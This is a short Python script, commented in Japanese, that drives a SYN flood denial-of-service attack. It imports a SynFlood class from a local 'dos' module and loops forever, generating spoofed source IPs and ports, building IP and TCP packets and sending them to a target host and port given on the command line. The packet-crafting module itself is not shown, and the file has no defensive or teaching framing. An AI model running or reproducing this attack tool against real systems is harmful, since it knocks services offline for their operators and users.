import sys
# pychacheを作成しない
sys.dont_write_bytecode = True
from dos import syn_flood as sf
import argparse

class Main:
    # SYN Flood攻撃クラス
    da = sf.SynFlood(sys.argv[1], sys.argv[2])
    while True:
        da.createSrcIp()
        da.createSrcPort()
        da.createIpPacket()
        da.createTcpPacket()
        da.sendPacket()